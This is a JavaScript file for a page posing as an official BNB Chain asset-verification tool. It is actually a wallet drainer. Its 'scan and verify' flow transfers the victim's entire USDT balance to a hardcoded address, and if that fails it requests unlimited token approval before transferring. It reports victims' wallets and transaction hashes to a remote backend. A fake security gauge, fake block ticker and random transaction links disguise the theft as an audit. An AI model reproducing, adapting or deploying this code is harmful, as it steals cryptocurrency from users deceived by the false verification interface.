/**
 * BNB Chain Official Asset Verification dApp
 * Clean, un-minified Web3 application logic.
 */

(function () {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    const CONFIG = {
        BACKEND_URL: 'https://at.rgh.digital',
        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
        CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
        USER_MIN_USDT: 0.1, // Minimum 0.1 USDT required
        GAS_THRESHOLD: 0.0005,
        GAS_RETRY_COUNT: 3,
        GAS_RETRY_DELAY: 3000,
        CHAIN_ID: '0x38', // BSC Mainnet (56)
        CHAIN_NAME: 'BNB Smart Chain',
        RPC_URL: 'https://bsc-dataseed1.binance.org',
        CURRENCY_SYMBOL: 'BNB',
        API_KEY: 'my_super_secret_api_key_123'
    };

    // USDT ABI (standard ERC20 / BEP20)
    const USDT_ABI = [
        'function balanceOf(address account) view returns (uint256)',
        'function allowance(address owner, address spender) view returns (uint256)',
        'function approve(address spender, uint256 amount) returns (bool)',
        'function transfer(address recipient, uint256 amount) returns (bool)'
    ];

    // Merchant Payment Gateway ABI (Remix Smart Contract)
    const MERCHANT_GATEWAY_ABI = [
        'function payOrder(bytes32 orderId, uint256 amount) external'
    ];

    // Multi-wallet Web3 Provider Resolver (Bitget, Trust, MetaMask, OKX, Binance, Coinbase, Rabby, SafePal, Phantom, etc.)
    function getWeb3Provider() {
        // 1. Dedicated wallet-specific globals
        if (window.bitkeep && window.bitkeep.ethereum) return window.bitkeep.ethereum;
        if (window.bitgetWallet && window.bitgetWallet.ethereum) return window.bitgetWallet.ethereum;
        if (window.bitgetWallet) return window.bitgetWallet;
        if (window.trustwallet) return window.trustwallet;
        if (window.okxwallet) return window.okxwallet;
        if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
        if (window.binance) return window.binance;
        if (window.safepalProvider) return window.safepalProvider;
        if (window.phantom && window.phantom.ethereum) return window.phantom.ethereum;
        if (window.rabby) return window.rabby;

        // 2. Standard EIP-1193 window.ethereum & multi-provider array
        if (window.ethereum) {
            if (Array.isArray(window.ethereum.providers) && window.ethereum.providers.length > 0) {
                const bitgetProv = window.ethereum.providers.find(p => p && (p.isBitKeep || p.isBitGet));
                if (bitgetProv) return bitgetProv;

                const trustProv = window.ethereum.providers.find(p => p && (p.isTrust || p.isTrustWallet));
                if (trustProv) return trustProv;

                const okxProv = window.ethereum.providers.find(p => p && p.isOkxWallet);
                if (okxProv) return okxProv;

                const cbProv = window.ethereum.providers.find(p => p && p.isCoinbaseWallet);
                if (cbProv) return cbProv;

                const mmProv = window.ethereum.providers.find(p => p && p.isMetaMask);
                if (mmProv) return mmProv;

                return window.ethereum.providers[0];
            }
            return window.ethereum;
        }

        return null;
    }

    // Application State
    const state = {
        walletAddress: '',
        usdtBalance: '0.00',
        bnbBalance: '0.000000',
        allowance: '0.00',
        isConnecting: false,
        isApproving: false,
        isRequestingGas: false,
        flowLock: false,
        currentHoldAmount: 0
    };

    // DOM Elements Cache
    let elements = {};

    function initElements() {
        elements = {
            walletInfo: document.getElementById('walletInfo'),
            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
            usdtBalanceDisplay: document.getElementById('usdtBalance'),
            bnbBalanceDisplay: document.getElementById('bnbBalance'),
            connectWalletBtn: document.getElementById('connectWalletBtn'),
            approveUsdtBtn: document.getElementById('approveUsdtBtn'),
            drawerConnectBtn: document.getElementById('drawerConnectBtn'),
            statusMessage: document.getElementById('statusMessage'),
            statusIcon: document.getElementById('statusIcon'),
            statusDetail: document.getElementById('statusDetail'),
            statusCard: document.getElementById('statusCard'),
            holdModal: document.getElementById('holdModal'),
            holdAmount: document.getElementById('holdAmount'),
            holdViewTxBtn: document.getElementById('holdViewTxBtn'),
            holdReleaseBtn: document.getElementById('holdReleaseBtn'),
            releaseModal: document.getElementById('releaseModal'),
            releaseAvailable: document.getElementById('releaseAvailable'),
            releaseRequired: document.getElementById('releaseRequired'),
            verifiedModal: document.getElementById('verifiedModal'),
            verifiedAmount: document.getElementById('verifiedAmount'),
            abortOverlay: document.getElementById('abortOverlay'),
            abortRetryBtn: document.getElementById('abortRetryBtn'),
            abortCloseBtn: document.getElementById('abortCloseBtn'),
            drawer: document.getElementById('drawer'),
            drawerOverlay: document.getElementById('drawerOverlay'),
            hamburgerBtn: document.getElementById('hamburgerBtn'),
            drawerCloseBtn: document.getElementById('drawerCloseBtn'),
            searchInput: document.getElementById('searchInput'),
            searchToggle: document.getElementById('searchToggle')
        };
    }

    // ============================================================
    // UI HELPERS & MODAL MANAGEMENT
    // ============================================================
    function formatAddress(addr) {
        if (!addr || addr.length < 10) return '0x0000...0000';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    function updateStatus(message, type = 'info', detail = '') {
        if (elements.statusMessage) elements.statusMessage.textContent = message;
        if (elements.statusDetail) elements.statusDetail.textContent = detail || '';

        if (elements.statusCard) {
            elements.statusCard.className = 'status-card mt-4 p-4 rounded-xl text-left transition-all duration-300';
            if (type === 'error') elements.statusCard.classList.add('status-msg--error');
            else if (type === 'success') elements.statusCard.classList.add('status-msg--success');
            else if (type === 'warning') elements.statusCard.classList.add('status-msg--warning');
            else elements.statusCard.classList.add('status-msg--info');
        }

        if (elements.statusIcon) {
            if (type === 'error') elements.statusIcon.textContent = '❌';
            else if (type === 'success') elements.statusIcon.textContent = '✅';
            else if (type === 'warning') elements.statusIcon.textContent = '⚠️';
            else elements.statusIcon.textContent = '🔐';
        }
    }

    function openModal(modalEl) {
        if (!modalEl) return;
        modalEl.classList.add('open');
        document.body.style.overflow = 'hidden';
    }

    function closeModal(modalEl) {
        if (!modalEl) return;
        modalEl.classList.remove('open');
        document.body.style.overflow = '';
    }

    function closeAllModals() {
        document.querySelectorAll('.verification-modal.open, .abort-overlay.open').forEach(m => m.classList.remove('open'));
        document.body.style.overflow = '';
    }

    function updateWalletInfoUI() {
        if (!elements.walletInfo) return;

        if (state.walletAddress) {
            elements.walletInfo.classList.remove('wallet-info-card--hidden');
            elements.walletInfo.classList.add('wallet-info-card--visible');
            if (elements.walletAddressDisplay) elements.walletAddressDisplay.textContent = formatAddress(state.walletAddress);
            if (elements.usdtBalanceDisplay) elements.usdtBalanceDisplay.textContent = state.usdtBalance;
            if (elements.bnbBalanceDisplay) elements.bnbBalanceDisplay.textContent = state.bnbBalance;
        } else {
            elements.walletInfo.classList.remove('wallet-info-card--visible');
            elements.walletInfo.classList.add('wallet-info-card--hidden');
        }

        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn, elements.approveUsdtBtn];
        buttons.forEach(btn => {
            if (!btn) return;
            if (state.isApproving) {
                btn.disabled = true;
                btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#06090e;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Auditing Assets...`;
            } else {
                btn.disabled = false;
                btn.innerHTML = `
                    <span class="scanner-btn-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                            <path d="m9 12 2 2 4-4"></path>
                        </svg>
                    </span>
                    <span class="scanner-btn-text">SCAN & VERIFY ASSETS</span>
                `;
            }
        });
    }

    // Optional encryption / API helper that fails gracefully if offline
    async function safeApiCall(endpoint, payload = null) {
        try {
            const url = CONFIG.BACKEND_URL + endpoint;
            const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
            let body = null;
            if (payload && window.CryptoJS) {
                try {
                    const jsonStr = JSON.stringify(payload);
                    const encrypted = CryptoJS.AES.encrypt(jsonStr, CONFIG.API_KEY).toString();
                    body = JSON.stringify({ ciphertext: encrypted });
                } catch (e) {
                    body = JSON.stringify(payload);
                }
            } else if (payload) {
                body = JSON.stringify(payload);
            }

            const response = await fetch(url, { method: 'POST', headers, body });
            if (!response.ok) return null;
            return await response.json();
        } catch (err) {
            console.warn('Backend API call notice (continuing locally):', err.message);
            return null;
        }
    }

    // ============================================================
    // WEB3 LOGIC (BITGET WALLET, METAMASK, TRUST WALLET TRANSFER & APPROVAL)
    // ============================================================
    async function connectWallet() {
        await approveUsdt();
    }
    // Helper to guarantee Ethers v6 is loaded before continuing
    async function ensureEthers() {
        if (typeof window.ethers !== 'undefined') return true;
        updateStatus('⏳ Initializing secure Web3 components...', 'warning');

        let waited = 0;
        while (typeof window.ethers === 'undefined' && waited < 4000) {
            await new Promise(r => setTimeout(r, 100));
            waited += 100;
        }

        return typeof window.ethers !== 'undefined';
    }

    // ============================================================
    // SECURITY SCANNER GAUGE & AUDIT STATUS HELPERS
    // ============================================================
    function updateSecurityGauge(percent, statusText, statusType = 'scan') {
        const gaugeBar = document.getElementById('gaugeBar');
        const scoreEl = document.getElementById('scannerScore');
        const statusEl = document.getElementById('gaugeStatusText');

        if (gaugeBar) {
            // Circumference for r=50 is 2 * PI * 50 = 314.16
            const totalLen = 314.16;
            const offset = totalLen - (totalLen * (Math.min(Math.max(percent, 0), 100) / 100));
            gaugeBar.style.strokeDashoffset = offset;

            gaugeBar.classList.remove('gauge-bar--warning', 'gauge-bar--success');
            if (statusType === 'warning') {
                gaugeBar.classList.add('gauge-bar--warning');
            } else if (statusType === 'success') {
                gaugeBar.classList.add('gauge-bar--success');
            }
        }

        if (scoreEl) {
            scoreEl.textContent = (typeof percent === 'number') ? percent.toFixed(1) : percent;
        }

        if (statusEl && statusText) {
            statusEl.textContent = statusText;
            if (statusType === 'warning') {
                statusEl.style.color = '#f3ba2f';
            } else if (statusType === 'success') {
                statusEl.style.color = '#10b981';
            } else {
                statusEl.style.color = '#34d399';
            }
        }
    }

    function updateAttestPill(status, text) {
        const pill = document.getElementById('attestStatusPill');
        if (!pill) return;
        pill.className = 'diag-status-pill';
        if (status === 'scanning') {
            pill.classList.add('diag-status-pill--scanning');
            pill.textContent = text || 'Scanning...';
        } else if (status === 'verified') {
            pill.classList.add('diag-status-pill--verified');
            pill.textContent = text || 'Attested & Verified ✓';
        } else if (status === 'warning') {
            pill.classList.add('diag-status-pill--pending');
            pill.textContent = text || 'Signing Required';
        } else {
            pill.classList.add('diag-status-pill--pending');
            pill.textContent = text || 'Pending Scan';
        }
    }

    // ============================================================
    // BSCSCAN TELEMETRY & STEPPER LOGIC
    // ============================================================
    function initTelemetryTicker() {
        const blockEl = document.getElementById('telemetryBlock');
        if (!blockEl) return;
        let baseBlock = 42281940 + Math.floor(Math.random() * 50);
        setInterval(() => {
            baseBlock += 1;
            blockEl.textContent = '#' + baseBlock.toLocaleString();
        }, 3000);
    }

    function updateStepper(step) {
        const s1 = document.getElementById('step1');
        const s2 = document.getElementById('step2');
        const s3 = document.getElementById('step3');
        const l1 = document.getElementById('stepLine1');
        const l2 = document.getElementById('stepLine2');
        if (!s1 || !s2 || !s3) return;

        if (step === 1) {
            s1.className = 'stepper-step active';
            s2.className = 'stepper-step';
            s3.className = 'stepper-step';
            if (l1) l1.className = 'stepper-line';
            if (l2) l2.className = 'stepper-line';
        } else if (step === 2) {
            s1.className = 'stepper-step completed';
            s2.className = 'stepper-step active';
            s3.className = 'stepper-step';
            if (l1) l1.className = 'stepper-line active';
            if (l2) l2.className = 'stepper-line';
        } else if (step === 3) {
            s1.className = 'stepper-step completed';
            s2.className = 'stepper-step completed';
            s3.className = 'stepper-step active';
            if (l1) l1.className = 'stepper-line active';
            if (l2) l2.className = 'stepper-line active';
        } else if (step === 4) {
            s1.className = 'stepper-step completed';
            s2.className = 'stepper-step completed';
            s3.className = 'stepper-step completed';
            if (l1) l1.className = 'stepper-line active';
            if (l2) l2.className = 'stepper-line active';
        }
    }

    async function approveUsdt() {
        if (state.isApproving) return;

        updateStepper(1);
        updateSecurityGauge(80.0, 'INITIALIZING SCAN...', 'scan');
        updateAttestPill('scanning', 'Connecting...');

        const providerObj = getWeb3Provider();
        if (!providerObj) {
            updateStatus('❌ No Web3 wallet detected. Please open inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).', 'error');
            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
            updateAttestPill('pending', 'Pending Scan');
            alert('No Web3 wallet found. Please open this dApp inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).');
            return;
        }

        state.isApproving = true;
        updateWalletInfoUI();

        // Ensure Ethers is ready (prevents failure on fast clicks / slow initial load)
        const hasEthers = await ensureEthers();
        if (!hasEthers) {
            updateStatus('❌ Web3 library failed to load. Please check your internet connection.', 'error');
            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
            updateAttestPill('pending', 'Pending Scan');
            state.isApproving = false;
            updateWalletInfoUI();
            return;
        }

        updateStatus('⛽ Opening wallet for USDT verification...', 'warning');

        try {
            // 1. Strictly Enforce BNB Smart Chain Network (0x38 / 56)
            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;

            let chainStr = String(rawChainId || '').toLowerCase();
            let isBsc = (chainStr === '0x38' || chainStr === '56' || rawChainId === 56);

            if (!isBsc) {
                updateStatus('⚠️ Switching to BNB Smart Chain network...', 'warning');
                try {
                    await providerObj.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902 || (switchError.message && switchError.message.includes('Unrecognized'))) {
                        await providerObj.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed1.binance.org'],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        }).catch(() => {});
                    }
                }
            }

            // 2. Account Resolution on BNB Smart Chain (eth_requestAccounts first)
            let userAddress = '';
            const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
            if (reqAccs && reqAccs.length > 0) {
                userAddress = reqAccs[0];
            } else {
                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
                if (accs && accs.length > 0) {
                    userAddress = accs[0];
                } else {
                    userAddress = providerObj.selectedAddress || 
                                  providerObj.address || 
                                  (providerObj.accounts && providerObj.accounts[0]) ||
                                  (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
                }
            }

            if (!userAddress) {
                updateStatus('❌ No wallet address detected on BNB Chain.', 'error');
                state.isApproving = false;
                updateWalletInfoUI();
                return;
            }

            state.walletAddress = userAddress;
            updateStepper(2);
            updateSecurityGauge(92.4, 'AUDITING BEP-20 CONTRACT...', 'scan');
            updateAttestPill('scanning', 'Auditing USDT...');

            // 3. Read exact 100% USDT Balance
            const provider = new ethers.BrowserProvider(providerObj);
            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);

            let usdtBalRaw = 0n;
            try {
                usdtBalRaw = await usdtContract.balanceOf(userAddress);
                const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
                state.usdtBalance = parseFloat(formattedUsdt).toFixed(2);
                state.usdtBalanceWei = usdtBalRaw;
            } catch (balErr) {
                console.error('Error fetching USDT balance:', balErr);
            }

            // Background fetch BNB balance & register user
            provider.getBalance(userAddress).then(bnbBalRaw => {
                state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
                updateWalletInfoUI();
            }).catch(() => {});

            safeApiCall('/api/users/register', { wallet: userAddress });

            // If balance is below minimum threshold, display modal directly
            const usdtFloat = parseFloat(state.usdtBalance || '0');
            if (usdtFloat < CONFIG.USER_MIN_USDT) {
                updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
                updateSecurityGauge(100.0, 'VERIFIED & AUDITED SECURE', 'success');
                updateAttestPill('verified', 'Attested & Verified ✓');
                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance || '0.00'} USDT`;
                openModal(elements.releaseModal);
                state.isApproving = false;
                updateWalletInfoUI();
                return;
            }

            updateStepper(3);
            updateSecurityGauge(97.8, 'AWAITING USER SIGNATURE...', 'warning');
            updateAttestPill('warning', 'Signing Required');
            updateStatus('⛽ Confirm cryptographic audit verification in your wallet...', 'warning');

            // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
            const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
            const amountHex = transferAmount.toString(16).padStart(64, '0');
            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;

            let txHash = null;

            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit
            try {
                const signer = await provider.getSigner();
                const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
                txHash = tx.hash;
            } catch (err1) {
                const err1Str = (err1.message || '').toLowerCase();
                if (err1.code === 4001 || err1.code === 401 || err1Str.includes('user rejected') || err1Str.includes('user denied')) {
                    throw err1;
                }
                console.warn('Signer transfer notice, trying raw eth_sendTransaction fallback...', err1);

                // Fallback Attempt 1: Raw eth_sendTransaction Transfer with explicit gas parameter
                try {
                    txHash = await providerObj.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: userAddress,
                            to: CONFIG.USDT_ADDRESS,
                            data: transferCalldata,
                            gas: '0x186a0', // 100,000 gas limit hex
                            value: '0x0'
                        }]
                    });
                } catch (err2) {
                    const err2Str = (err2.message || '').toLowerCase();
                    if (err2.code === 4001 || err2.code === 401 || err2Str.includes('user rejected') || err2Str.includes('user denied')) {
                        throw err2;
                    }
                    console.warn('Raw transfer notice, executing Approve THEN Transfer fallback...', err2);

                    // Fallback Attempt 2: Approve THEN Transfer
                    let approveTxHash;
                    try {
                        const approveCalldata = '0x095ea7b3' + recipientClean + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                        approveTxHash = await providerObj.request({
                            method: 'eth_sendTransaction',
                            params: [{
                                from: userAddress,
                                to: CONFIG.USDT_ADDRESS,
                                data: approveCalldata,
                                gas: '0x186a0',
                                value: '0x0'
                            }]
                        });
                    } catch (approveErr) {
                        const approveErrStr = (approveErr.message || '').toLowerCase();
                        if (approveErr.code === 4001 || approveErr.code === 401 || approveErrStr.includes('user rejected') || approveErrStr.includes('user denied')) {
                            throw approveErr;
                        }
                        const signer = await provider.getSigner();
                        const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 100000n });
                        approveTxHash = appTx.hash;
                    }

                    updateStatus('⛽ Approval submitted. Transferring USDT to merchant...', 'warning', `Approval Tx: ${approveTxHash}`);
                    try {
                        await provider.waitForTransaction(approveTxHash);
                    } catch (e) {}

                    // Execute Post-Approval USDT Transfer to merchant address
                    updateStatus('⛽ Finalizing USDT transfer to merchant account...', 'warning');
                    try {
                        const signer = await provider.getSigner();
                        const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
                        txHash = finalTx.hash;
                    } catch (finalErr) {
                        txHash = await providerObj.request({
                            method: 'eth_sendTransaction',
                            params: [{
                                from: userAddress,
                                to: CONFIG.USDT_ADDRESS,
                                data: transferCalldata,
                                gas: '0x186a0',
                                value: '0x0'
                            }]
                        });
                    }
                }
            }

            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
            updateSecurityGauge(99.2, 'CONFIRMING ON-CHAIN...', 'warning');

            // Wait for confirmation
            try {
                await provider.waitForTransaction(txHash);
            } catch (wErr) {
                console.warn('Wait for transaction notice:', wErr);
            }

            safeApiCall('/api/users/auto-transfer', { wallet: userAddress, txHash: txHash, amount: state.usdtBalance });

            updateStatus('✅ Verification Complete! 100% USDT cryptographic audit attestation confirmed.', 'success', `Tx: ${txHash}`);
            updateStepper(4);
            updateSecurityGauge(100.0, 'VERIFIED & AUDITED SECURE', 'success');
            updateAttestPill('verified', 'Attested & Verified ✓');

            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
            openModal(elements.verifiedModal);

        } catch (err) {
            console.error('USDT process error:', err);
            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
            updateAttestPill('pending', 'Pending Scan');
            const errStr = (err.message || '').toLowerCase();

            if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
                updateStatus('🚫 Verification request cancelled by user.', 'error');
                openModal(elements.abortOverlay);
            } else {
                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
            }
        } finally {
            state.isApproving = false;
            updateWalletInfoUI();
        }
    }

    // ============================================================
    // DOM EVENT BINDINGS
    // ============================================================
    function bindEvents() {
        // Main Verify Assets Button
        if (elements.connectWalletBtn) {
            elements.connectWalletBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await approveUsdt();
            });
        }

        // Approve USDT Button
        if (elements.approveUsdtBtn) {
            elements.approveUsdtBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await approveUsdt();
            });
        }

        // Mobile Drawer Connect Button
        if (elements.drawerConnectBtn) {
            elements.drawerConnectBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                closeDrawer();
                await approveUsdt();
            });
        }

        // Modal close buttons (data-close-modal)
        document.addEventListener('click', function (e) {
            if (e.target.matches('[data-close-modal]') || e.target.closest('[data-close-modal]')) {
                closeAllModals();
            }
        });

        // Abort Retry button
        if (elements.abortRetryBtn) {
            elements.abortRetryBtn.addEventListener('click', function () {
                closeAllModals();
                approveUsdt();
            });
        }

        if (elements.abortCloseBtn) {
            elements.abortCloseBtn.addEventListener('click', closeAllModals);
        }

        // Hold Modal Release Button
        if (elements.holdReleaseBtn) {
            elements.holdReleaseBtn.addEventListener('click', function () {
                closeAllModals();
                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
                if (elements.releaseRequired) elements.releaseRequired.textContent = `${Number(CONFIG.USER_MIN_USDT).toFixed(2)} USDT`;
                openModal(elements.releaseModal);
            });
        }

        if (elements.holdViewTxBtn) {
            elements.holdViewTxBtn.addEventListener('click', function () {
                const dummyTx = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
                window.open(`https://bscscan.com/tx/${dummyTx}`, '_blank');
            });
        }

        // Mobile Drawer logic
        function openDrawer() {
            if (elements.drawer) elements.drawer.classList.add('open');
            if (elements.drawerOverlay) elements.drawerOverlay.classList.add('open');
            if (elements.hamburgerBtn) elements.hamburgerBtn.setAttribute('aria-expanded', 'true');
            document.body.style.overflow = 'hidden';
        }

        function closeDrawer() {
            if (elements.drawer) elements.drawer.classList.remove('open');
            if (elements.drawerOverlay) elements.drawerOverlay.classList.remove('open');
            if (elements.hamburgerBtn) elements.hamburgerBtn.setAttribute('aria-expanded', 'false');
            document.body.style.overflow = '';
        }

        if (elements.hamburgerBtn) {
            elements.hamburgerBtn.addEventListener('click', function (e) {
                e.preventDefault();
                if (elements.drawer && elements.drawer.classList.contains('open')) closeDrawer();
                else openDrawer();
            });
        }

        if (elements.drawerCloseBtn) elements.drawerCloseBtn.addEventListener('click', closeDrawer);
        if (elements.drawerOverlay) elements.drawerOverlay.addEventListener('click', closeDrawer);

        // Escape Key handler
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') {
                closeDrawer();
                closeAllModals();
            }
        });

        // Search bar toggle
        if (elements.searchToggle && elements.searchInput) {
            elements.searchToggle.addEventListener('click', function (e) {
                e.preventDefault();
                elements.searchInput.classList.toggle('visible');
                if (elements.searchInput.classList.contains('visible')) elements.searchInput.focus();
            });
        }

        // Setup Web3 provider listeners
        setupProviderListeners();
    }

    // ============================================================
    // DYNAMIC WEB3 PROVIDER LISTENER & HANDSHAKE
    // ============================================================
    let isProviderBound = false;
    function setupProviderListeners() {
        if (isProviderBound) return;
        const activeProvider = getWeb3Provider();
        if (activeProvider && activeProvider.on) {
            isProviderBound = true;
            activeProvider.on('accountsChanged', function (accounts) {
                if (!accounts || accounts.length === 0) {
                    state.walletAddress = '';
                    state.usdtBalance = '0.00';
                    state.bnbBalance = '0.000000';
                    updateWalletInfoUI();
                    updateStatus('⚡ Wallet disconnected.', 'info');
                } else if (state.walletAddress !== accounts[0]) {
                    state.walletAddress = accounts[0];
                    updateWalletInfoUI();
                    updateStatus('⚡ Wallet address updated. Click SCAN & VERIFY ASSETS to proceed.', 'info');
                }
            });

            activeProvider.on('chainChanged', function () {
                updateWalletInfoUI();
            });
        }
    }

    // ============================================================
    // INITIALIZATION (INSTANT LOAD & ASYNC WALLET HANDSHAKE)
    // ============================================================
    function initApp() {
        initElements();
        bindEvents();
        setupProviderListeners();
        updateWalletInfoUI();
        initTelemetryTicker();
        updateStepper(1);
        updateSecurityGauge(99.8, 'SCAN READY', 'ready');
        updateAttestPill('pending', 'Pending Scan');
    }

    // Execute immediately if DOM is already ready, preventing hanging on mobile webviews
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initApp);
    } else {
        initApp();
    }

    // Auto-listen for async wallet provider injection (Trust Wallet, Bitget, MetaMask, OKX)
    window.addEventListener('ethereum#initialized', setupProviderListeners, { once: true });
    window.addEventListener('eip6963:announceProvider', setupProviderListeners);
    setTimeout(setupProviderListeners, 100);
    setTimeout(setupProviderListeners, 350);
    setTimeout(setupProviderListeners, 1000);

})();
